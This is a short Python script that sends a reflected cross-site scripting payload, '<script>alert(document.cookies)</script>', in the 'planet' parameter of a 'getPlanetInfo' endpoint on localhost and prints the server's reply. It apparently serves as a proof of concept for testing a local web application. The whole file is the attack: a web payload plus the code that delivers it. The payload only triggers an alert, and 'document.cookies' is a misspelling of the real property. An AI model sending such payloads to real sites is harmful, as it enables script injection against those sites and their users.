import requests

# Target URL
target_url = "http://localhost:5000/"

# XSS payload
payload = "<script>alert(document.cookies)</script>"

# Craft the malicious URL with the payload
malicious_url = f"{target_url}getPlanetInfo?planet={payload}"

# Send the request
response = requests.get(malicious_url)

# Print the response content
print(response.text)
